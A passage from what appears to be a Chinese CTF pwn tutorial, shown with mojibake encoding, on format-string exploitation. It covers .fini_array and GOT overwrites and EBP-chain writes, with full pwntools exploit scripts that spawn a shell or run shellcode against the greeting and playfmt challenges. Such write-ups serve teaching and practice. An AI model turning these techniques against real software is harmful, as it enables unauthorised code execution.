æ®µçš„å‡½æ•°æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/ioam7T.png" srcset="/img/loading.gif" alt><br>å…¶ä¸­<code>FINI_ARRAY</code>åŒºï¼šç¨‹åºç»“æŸéœ€è¦ç»è¿‡è¿™é‡Œï¼Œæ˜¯å¯ä»¥ä¿®æ”¹ä¸€ä¸‹è¿™é‡Œçš„ææ„å‡½æ•°ã€‚ä¿®æ”¹<code>.fini_array</code>åŒºçš„ç¬¬ä¸€ä¸ªå…ƒç´ ä¸ºstartï¼Œå°±å¯ä»¥å®ç°è®©ç¨‹åºä»å¤´å†æ¥ä¸€æ¬¡ï¼Œä¹Ÿå°±åˆå¯ä»¥ç”¨ä¸€æ¬¡æ¼æ´ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯,è¿™ä¸ªåŒºçš„å†…å®¹åœ¨å†æ¬¡ä»startå¼€å§‹æ‰§è¡Œååˆä¼šè¢«ä¿®æ”¹ã€‚</p><h4 id="mma-ctf-2nd-2016-greeting"><a href="#mma-ctf-2nd-2016-greeting" class="headerlink" title="mma-ctf-2nd-2016-greeting"></a>mma-ctf-2nd-2016-greeting</h4><h5 id="ä¿æŠ¤å’Œarch-2"><a href="#ä¿æŠ¤å’Œarch-2" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h5><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h5 id="idaåˆ†æ-2"><a href="#idaåˆ†æ-2" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+1Ch] [ebp-84h]</span>  <span class="hljs-keyword">char</span> v5; <span class="hljs-comment">// [esp+5Ch] [ebp-44h]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// [esp+9Ch] [ebp-4h]</span>  v6 = __readgsdword(<span class="hljs-number">0x14</span>u);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please tell me your name... "</span>);  <span class="hljs-keyword">if</span> ( !getnline(&amp;v5, <span class="hljs-number">64</span>) )    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Don't ignore me ;( "</span>);  <span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">"Nice to meet you, %s :)\n"</span>, &amp;v5);  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(&amp;s);&#125;</code></pre></div><p>å‘ç°å‡½æ•°åœ¨è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä»¥åå°±ç»“æŸäº†ï¼Œæ²¡æœ‰åœ¨è°ƒç”¨å…¶ä»–çš„å‡½æ•°ï¼Œä¹Ÿå°±æ— æ³•åˆ©ç”¨GOTåŠ«æŒæˆ–è€…ä¿®æ”¹ret addrã€‚<br>å†çœ‹ä¸‹getnlineå‡½æ•°ï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">size_t</span> __<span class="hljs-function">cdecl <span class="hljs-title">getnline</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s, <span class="hljs-keyword">int</span> n)</span></span>&#123;  <span class="hljs-keyword">char</span> *v3; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span>  fgets(s, n, <span class="hljs-built_in">stdin</span>);  v3 = <span class="hljs-built_in">strchr</span>(s, <span class="hljs-number">10</span>);  <span class="hljs-keyword">if</span> ( v3 )    *v3 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strlen</span>(s);&#125;</code></pre></div><p>å‘ç°æœ‰äº†strlençš„å‡½æ•°ï¼Œå¹¶ä¸”å…¶å‚æ•°ä¹Ÿæ˜¯å¯ä»¥æ§åˆ¶çš„ã€‚<br>è¿™å°±æœ‰äº†æ”»å‡»æ€è·¯ï¼Œåœ¨è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´æ—¶ï¼š</p><ul><li>ä¿®æ”¹<code>.fini_array</code>åŒºçš„ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆåœ°å€ä¸ºstartï¼Œè®©å…¶é‡å¯è·‘ä¸€æ¬¡ç¨‹åº</li><li>å› ä¸ºçŸ¥é“è‚¯å®šä¼šè·‘åˆ°strlené‚£é‡Œï¼Œæ‰€ä»¥åœ¨åŠ«æŒstrlençš„GOTä¸ºsystem</li><li>å¾…ç¨‹åºé‡æ–°è·‘èµ·æ¥ï¼Œå°±åœ¨ä¼ é€ä¸€ä¸ª<code>/bin/sh</code>å³å¯</li></ul><p>æ³¨æ„çš„æ˜¯,è¿™ä¸ª<code>.fini_array</code>åŒºçš„å†…å®¹åœ¨å†æ¬¡ä»startå¼€å§‹æ‰§è¡Œååˆä¼šè¢«ä¿®æ”¹,ä¸”ç¨‹åºå¯è¯»å–çš„å­—èŠ‚æ•°æœ‰é™,å› æ­¤éœ€è¦åŒæ—¶ä¿®æ”¹ä¸¤ä¸ªåœ°å€ï¼Œä¹Ÿå°±æ˜¯å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œè¿™ä¸ªé¢˜å¹¶ä¸”éœ€è¦åˆç†è°ƒæ•´payloadã€‚</p><h5 id="gdbè°ƒè¯•-1"><a href="#gdbè°ƒè¯•-1" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h5><p><img src="http://qiqianyun.chumen77.xyz/uPic/wRVcqD.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªé¢˜ç›®å› ä¸ºå‰é¢æœ‰</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">"Nice to meet you, %s :)\n"</span>, &amp;v5);</code></pre></div><p>æ‰€ä»¥å…¶æ ˆä¸Šä¼šæ”¾ä¸Š<code>Nice to meet you,</code>çš„å­—ç¬¦ä¸²ï¼Œæ­¤æ—¶éœ€è¦æ³¨æ„å¯¹é½ã€‚å¯¹é½åå‘ç°åç§»ä¸º12ï¼Œåœ¨å†™payloadçš„æ—¶å€™å¯ä»¥ä½¿ç”¨å•æ¬¡printfå¤šæ¬¡å†™å…¥çš„è„šæœ¬ï¼Œæ‰€ä»¥æ¥<code>().ljust(0x32,&#39;a&#39;)</code> ,æ‰€ä»¥åç§»éœ€è¦åŠ ä¸Š<code>(0x32 - 2)/4</code> =  24 </p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.arch = <span class="hljs-string">'i386'</span>context.log_level = <span class="hljs-string">'debug'</span>io = process(<span class="hljs-string">'./greeting'</span>)<span class="hljs-comment"># io = remote('111.198.29.45',42729)</span>elf = ELF(<span class="hljs-string">'./greeting'</span>)strlen_got = <span class="hljs-number">0x08049A54</span>fini_array = <span class="hljs-number">0x08049934</span>start = <span class="hljs-number">0x080484F0</span>system_plt = <span class="hljs-number">0x08048490</span>offset = <span class="hljs-number">12</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultkey1 = <span class="hljs-number">0x08048490</span>prev = <span class="hljs-number">18</span> <span class="hljs-comment">#æ³¨æ„è¿™ä¸ªé¢˜åœ¨å¯æ§æ ¼å¼åŒ–å­—ç¬¦ä¸²å‰æœ‰å­—ç¬¦è¾“å‡º</span>payload = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>):    payload +=fmt_short(prev,(key1 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">24</span>+i)     prev = (key1 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>key2 = <span class="hljs-number">0x84F0</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmt_short(prev,(key2 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">26</span>+i)     prev = (key2 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload.ljust(<span class="hljs-number">0x32</span>,<span class="hljs-string">'a'</span>)payload += p32(strlen_got) + p32(strlen_got+<span class="hljs-number">2</span>) +p32(fini_array)io.recvuntil(<span class="hljs-string">'name...'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recvuntil(<span class="hljs-string">'name...'</span>)io.sendline(<span class="hljs-string">'/bin/sh\x00'</span>)io.interactive()</code></pre></div><h3 id="å°tips"><a href="#å°tips" class="headerlink" title="å°tips"></a>å°tips</h3><h4 id="ç»•è¿‡canary"><a href="#ç»•è¿‡canary" class="headerlink" title="ç»•è¿‡canary"></a>ç»•è¿‡canary</h4><p>å¯ä»¥åˆ©ç”¨fmtæ¼æ´ï¼Œä»»æ„è¯»çš„ç‰¹æ€§ï¼Œåœ¨æœ‰canaryçš„ç¨‹åºä¸­ï¼Œç®—å¥½åç§»ä»¥åè¯»å‡ºcanaryå­˜çš„æ£€éªŒå€¼ï¼ˆåŸºæœ¬éƒ½æ˜¯ä»¥00ç»“å°¾æ¯”è¾ƒå¥½æ‰¾ï¼‰ï¼Œç„¶ååœ¨buffer overflow æ—¶ï¼Œåœ¨å¯¹åº”ä½ç½®å¡«ä¸Šcanaryæ£€éªŒå€¼ï¼Œå³å¯ç»•è¿‡canaryã€‚</p><h4 id="printfå®¶æ—çš„å…¶ä»–å‡½æ•°"><a href="#printfå®¶æ—çš„å…¶ä»–å‡½æ•°" class="headerlink" title="printfå®¶æ—çš„å…¶ä»–å‡½æ•°"></a>printfå®¶æ—çš„å…¶ä»–å‡½æ•°</h4><p>é¦–å…ˆè¦è®°å¾—ä¸€ç‚¹å‡½æ•°å‚æ•°çš„å…¥æ ˆé¡ºåºï¼Œå¤§å¤šæ˜¯ä»å³åˆ°å·¦ä¾æ¬¡å…¥æ ˆï¼Œåœ¨é‡åˆ°å…¶ä»–çš„printfç±»å‡½æ•°ï¼Œåœ¨ç¡®å®šåç§»æ—¶ï¼Œä¸€å®šè¦è¦æŠŠæ¡fmtæ˜¯åœ¨æ ˆä¸Šçš„é‚£ä¸ªä½ç½®ï¼Œç„¶åè¿›è¡Œè®¡ç®—åç§»ï¼ˆä¸èƒ½ç®€å•çš„åˆ©ç”¨pwndbgçš„fmtargäº†ï¼‰ã€‚</p><ul><li>fprintfï¼šåŸºæœ¬ä¸Šä¸€æ ·ï¼Œåªæ˜¯format string ä¸åœ¨ç¬¬ä¸€å‚æ•°ï¼Œä½¿å¾—overwrite function table æ—¶å¾ˆéš¾ä½¿ç”¨</li><li>sprintfï¼šå¯ä»¥ç”¨%xxc æ¥é€ æˆæ–°çš„buffer overflow </li></ul><h4 id="åŠ«æŒ-stack-chk-fail"><a href="#åŠ«æŒ-stack-chk-fail" class="headerlink" title="åŠ«æŒ__stack_chk_fail"></a>åŠ«æŒ<code>__stack_chk_fail</code></h4><ul><li>åœ¨æ— æ³• stack overflow ä¹Ÿæ²¡æœ‰å…¶å®ƒå‡½æ•°å¯ä»¥åŠ«æŒæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¿®æ”¹<code>__stack_chk_fail</code> çš„ G0T å¹¶ä¸”ç ´å canary ä½¿è¿™ä¸ªå‡½æ•°è¢«callï¼Œç„¶åjmpæƒ³è¦çš„ç›®æ ‡åœ°å€</li><li>åœ¨åªæœ‰ä¸€æ¬¡ stack overflow+fmt æ—¶å¯ä»¥å°†<code>__stack_chk_fail</code>æ”¹æˆç›´æ¥ret ï¼Œè¿™æ ·stack overflow æ—¶å¯ä»¥æ— è§†canary ï¼Œä¹Ÿå¯ä»¥æ”¾ä¸ŠROPé“¾ï¼Œè¿›è€Œè¿›å…¥ä¹‹åçš„ROPã€‚</li></ul><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Š"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Š" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Š"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Š</h2><p>æœ‰æ—¶å€™å¹¶ä¸ä¼šè¿™ä¹ˆåˆšå¥½ format string çš„ buf åœ¨æ ˆä¸Šå½“å…¶åœ¨ data, bss æˆ–æ˜¯ heap ä¸Šçš„æƒ…å†µï¼Œæ— æ³•åœ¨ stack ä¸­æ”¾ä¸Šä¸€ä¸ª address ç»™ä»»æ„è¯»å†™çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨åœ¨  stack ä¸Šç°æœ‰çš„ pointer è¿›è¡Œå†™å€¼ã€‚å…¶ä¸­æœ€å¸¸ç”¨çš„å°±æ˜¯æ ˆä¸Šç°æœ‰çš„EBPé“¾ã€‚</p><h3 id="EBPé“¾"><a href="#EBPé“¾" class="headerlink" title="EBPé“¾"></a>EBPé“¾</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y9ykIj.png" srcset="/img/loading.gif" alt></p><p>æ­£å¦‚è¿™ä¸ªå›¾ï¼Œå½“ä¸€ä¸ªç¨‹åºå®Œæˆäº†ç”±mainâ€”&gt;Aâ€”&gt;Bçš„å‡½æ•°è°ƒç”¨ï¼Œæ ˆä¸Šå°±ä¼šå­˜åœ¨ä¸€ä¸ªEBPé“¾ï¼Œåƒå›¾ä¸­çš„ebp3(B)â€”&gt;ebp2(A)â€”&gt;ebp1(main)ï¼Œç„¶å</p><ul><li>é€šè¿‡æ‰¾å‡†offset1(ç®—ä¸€ä¸‹ebp3ä¸fmtå­—ç¬¦ä¸²è·ç¦»)å¯¹EBP2ä½¿ç”¨%hhnï¼Œå°±å¯ä»¥ä¿®æ”¹åˆ°EBP1çš„æœ€ä½ä½ï¼Œä½¿å¾—EBP1åœ¨ä¸€ä¸ª256çš„èŒƒå›´å†…è¿›è¡Œå˜åŒ–ï¼Œå¯ä»¥æ”¹æˆä½ æƒ³è¦ä¿®æ”¹çš„æ ˆå†…å­˜å•å…ƒæŒ‡é’ˆï¼ˆæ¯”å¦‚ret addressçš„æ ˆæŒ‡é’ˆï¼‰ã€‚</li><li>æ”¹å†™å¥½EBP1åï¼Œæ‰¾å‡†offset2 (ç®—ä¸€ä¸‹EBP2ä¸fmtå­—ç¬¦ä¸²è·ç¦»)å†å¯¹EBP1ä½¿ç”¨%hhnæˆ–è€…%hnï¼Œå³å¯å®Œæˆå¯¹ä½ æƒ³è¦ä¿®æ”¹çš„åœ°å€çš„å†™å€¼ã€‚</li></ul><p>ç®€å•æ¥è¯´ï¼Œè¿™ä¸ªæ”»å‡»è¿‡ç¨‹å°±æ˜¯ç¬¬ä¸€æ¬¡ä½¿ç”¨æ¼æ´æ˜¯æ„é€ å‡ºæˆ‘ä»¬è¦è¯»å†™çš„åœ°å€ï¼Œå†ä¸€æ¬¡åˆ™æ˜¯å¯¹å‰é¢æ„é€ å‡ºæ¥çš„åœ°å€è¿›è¡Œä»»æ„è¯»å†™ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>åœ¨è¿™ä¸ªè¿‡ç¨‹å½“ä¸­ä¸€å®šè¦å­¦ä¼šå¯¹æ ˆä¸Šçš„å·²æœ‰æ•°æ®çš„çµæ´»çš„è¿ç”¨</strong>ã€‚</p><p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸ªé¢˜æ¥ä»”ç»†åˆ†æä¸€ä¸‹</p><h4 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h4><h5 id="ä¿æŠ¤å’Œarch-3"><a href="#ä¿æŠ¤å’Œarch-3" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h5><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span></code></pre></div><p>æ²¡æœ‰ä»»ä½•ä¿æŠ¤ã€‚</p><h5 id="idaåˆ†æ-3"><a href="#idaåˆ†æ-3" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_fmt</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0xC8</span>u);    result = <span class="hljs-built_in">strncmp</span>(buf, <span class="hljs-string">"quit"</span>, <span class="hljs-number">4u</span>);    <span class="hljs-keyword">if</span> ( !result )      <span class="hljs-keyword">break</span>;    <span class="hljs-built_in">printf</span>(buf);  &#125;  <span class="hljs-keyword">return</span> result;&#125;</code></pre></div><p>å…¶ä¸­çœ‹åˆ°bufåœ¨bssæ®µï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/HRvwJA.png" srcset="/img/loading.gif" alt><br>è¿™å°±æ˜¯ä¸åœ¨æ ˆä¸Šï¼Œä¸èƒ½è·Ÿå‰é¢çš„é¢˜ç›®ä¸€æ ·ï¼Œç›´æ¥åœ¨æ ˆä¸Šå†™ä¸Šåœ°å€ï¼Œç„¶åæ¥å®Œæˆæ”»å‡»ã€‚</p><p>ä¸Šå±‚æœ‰main å’Œplayå‡½æ•°ï¼Œä¸€å…±ä¸‰å±‚ï¼Œä¸”åœ¨ç¬¬ä¸‰å±‚çš„do-fmtå‡½æ•°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè®©æˆ‘ä»¬å¾ˆæ–¹ä¾¿çš„ç”¨ebpé“¾æ¥å®Œæˆæ”»å‡»ã€‚ç„¶åï¼Œæœ‰æ— é™æ¬¡çš„è§¦å‘è¿™ä¸ªæ¼æ´çš„æœºä¼šã€‚</p><p>æ”»å‡»æ€è·¯ ï¼šå› ä¸ºæ²¡æœ‰å¼€nxä¿æŠ¤ï¼Œå¯ä»¥ç”¨shellcodeè¿›è¡Œæ”»å‡»ã€‚ä¿®æ”¹æŸä¸ªå‡½æ•°è¿”å›åœ°å€ï¼Œç„¶åæå‰åœ¨å¯æ§çš„bufåˆé€‚çš„åœ°æ–¹æ‘†ä¸Šshellcodeï¼Œç„¶åè·³ä¸Šå»å³å¯ã€‚</p><h5 id="gdbè°ƒè¯•-2"><a href="#gdbè°ƒè¯•-2" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h5><p>å®šä½åˆ°printfå‡½æ•°å¤„ï¼š</p><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ b *<span class="hljs-number">0x0804854F</span>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x804854f</span></code></pre></div><p>å¯ä»¥çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/lYT98n.png" srcset="/img/loading.gif" alt><br>espå¯„å­˜å™¨ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/vpsR9A.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œå°±æŠŠ<code>0xffffd338</code>å«åšebp3ï¼Œ<code>0xffffd348</code>ä¸ºebp2ï¼Œ<code>0xffffd358</code>ä¸ºebp1ã€‚</p><p>ç¬¬ä¸€æ¬¡ä¿®æ”¹ï¼šå¯¹ebp2ä½¿ç”¨<code>%xxhhn</code>ä¿®æ”¹ebp1ä¸ºdo-fmtå‡½æ•°çš„retaddr <code>0xffffd33c</code>çš„<strong>æ ˆæŒ‡é’ˆ</strong>ï¼ˆè¿™ä¸ªæ ˆæŒ‡é’ˆå¯ä»¥é€šè¿‡leakä¸€ä¸ªæ ˆåœ°å€ï¼Œç„¶åæ ¹æ®åç§»ç®—å‡ºæ¥ï¼‰</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/x0EjmA.png" srcset="/img/loading.gif" alt></p><p>ç¬¬äºŒæ¬¡ä¿®æ”¹ ï¼š å¯¹ebp1ä½¿ç”¨<code>%xxhn</code> ä¿®æ”¹retaddr <code>0x80485ad</code> ä¸ºä½ åœ¨bufå¤„æå‰æ‘†ä¸Šçš„shellcode</p><p>è¿™æ ·ç¨‹åºåœ¨é€€å‡ºè¿™ä¸ªdo-fmtå‡½æ•°å°±ä¼šjmpåˆ°shellcodeä¸Šï¼Œè¿™æ ·å°±æ‹¿åˆ°shelläº†ã€‚</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timecontext.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./ebp'</span>)<span class="hljs-comment"># io = remote('node3.buuoj.cn',29994)</span>buf = <span class="hljs-number">0x0804a080</span> + <span class="hljs-number">0x40</span> <span class="hljs-comment">#0x804a0c0</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(<span class="hljs-string">'%4$p'</span>)ret_stack_addr = int(io.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">28</span>print(<span class="hljs-string">'leak ret_stack_addr:'</span>+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[<span class="hljs-number">-2</span>:],<span class="hljs-number">16</span>)key2 = <span class="hljs-number">0xa0c0</span>payload = <span class="hljs-string">'%&#123;&#125;c%4$hhn'</span>.format(key1)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recv()payload = <span class="hljs-string">'%&#123;&#125;c%12$hn'</span>.format(key2)payload = payload.ljust(<span class="hljs-number">0x40</span>) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre></div><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯å¾ˆå•çº¯çš„ç›´æ¥åˆ©ç”¨ebpé“¾è¿›è¡Œæ”»å‡»å³å¯ã€‚</p><p>ç„¶åå†çœ‹ä¸€ä¸ªæœ‰ç‚¹ä¸ä¸€æ ·çš„é¢˜ç›®ï¼š</p><h3 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h3><h4 id="ä¿æŠ¤å’Œarch-4"><a href="#ä¿æŠ¤å’Œarch-4" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h4 id="idaåˆ†æ-4"><a href="#idaåˆ†æ-4" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt></p><p>è¿™ä¸€å¤„ä¼šè®©æ ˆç»“æ„çš„æƒ…å†µå˜å¾—æ— æ³•é¢„æµ‹ã€‚ç„¶åè¿›å…¥hardfmtï¼š</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )&#123;  read(<span class="hljs-number">0</span>, buff, <span class="hljs-number">0x1000</span>u);  <span class="hljs-built_in">printf</span>(buff);&#125;</code></pre></div><p>è¿™ä¸€å¤„å­˜åœ¨fmtæ¼æ´ï¼Œä¸”å¾€ä¸‹çœ‹æ•´ä¸ªç¨‹åºæ„Ÿè§‰æ²¡ä»€ä¹ˆå¥½åˆ©ç”¨çš„ï¼Œæ²¡ä»€ä¹ˆåé—¨å‡½æ•°ã€‚é‚£æ”»å‡»æ€è·¯å°±å¯ä»¥æ˜¯ï¼š<strong>æ”¹printfçš„gotè¡¨ï¼Œç„¶ååœ¨ç¬¬5æ¬¡ä¼ è¿‡å»<code>/bin/sh</code>å³å¯ã€‚</strong><br>ï¼ˆè¿™ä¸ªé¢˜ç›®æ€è·¯è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä½†æ˜¯æ ˆçš„éšæœºåŒ–ï¼Œè¿˜æœ‰å› ä¸ºè¿™ä¸ªæ¬¡æ•°çš„é™åˆ¶ï¼Œåœ¨å®é™…æ“ä½œè¿‡ç¨‹ä¸­ï¼Œè¦å……åˆ†çš„åˆ©ç”¨æ¯ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè®©è¿™ä¸ªé¢˜ç›®ä¸æ˜¯å¾ˆå®¹æ˜“åšï¼‰</p><h4 id="gdbåˆ†æ"><a href="#gdbåˆ†æ" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h4><p>å®šä½åˆ°æ¼æ´printfå‡½æ•°å¤„ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/KPo7Ve.png" srcset="/img/loading.gif" alt><br>ä¼šå‘ç°è¿™ä¸ªæƒ…å†µæ˜¯æ²¡æœ‰<strong>æ„æˆebpé“¾</strong>çš„ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦å’±ä»¬è‡ªå·±æ¥ä»”ç»†è§‚å¯Ÿæ ˆä¸Šçš„æ•°æ®ï¼Œç„¶åæ¥æŒ‘é€‰åˆé€‚çš„æ ˆæ•°æ®æ¥è¿›è¡Œåˆ©ç”¨ã€‚</p><p>å› ä¸ºæ ˆæƒ…å†µä¸ä¸€æ ·ï¼Œå¯ä»¥é€‰æ‹©æœ€é€‚åˆæˆ‘ä»¬åˆ©ç”¨æ¼æ´çš„æ ˆç©ºé—´æ¥è¿›è¡Œåˆ†æï¼Œè¿™æ ·åšèµ·æ¥ä¼šç®€å•ä¸€äº›ã€‚</p><p>æˆ‘è‡ªå·±é€‰æ‹©åœ¨åç§»åœ¨43çš„æ—¶å€™å¼€å§‹è¿›è¡Œåˆ†æï¼Œæƒ³åŠæ³•æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt><br>ä»”ç»†çœ‹ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µ ï¼Œç„¶åå†æ¬¡ä»”ç»†åˆ†æä¸‹æˆ‘ä»¬çš„ç›®æ ‡ ï¼š</p><ul><li>æ³„æ¼libcåŸºå€ï¼Œè®¡ç®—å‡ºsystemçš„å†…å­˜åœ°å€ã€‚</li><li>åœ¨æ ˆä¸Šæ„é€ å‡ºprintfçš„gotåœ°å€å’Œprintfçš„got+2çš„åœ°å€ï¼ˆ0x0804a014å’Œ0x0804a016ï¼‰</li><li>åœ¨æ„é€ 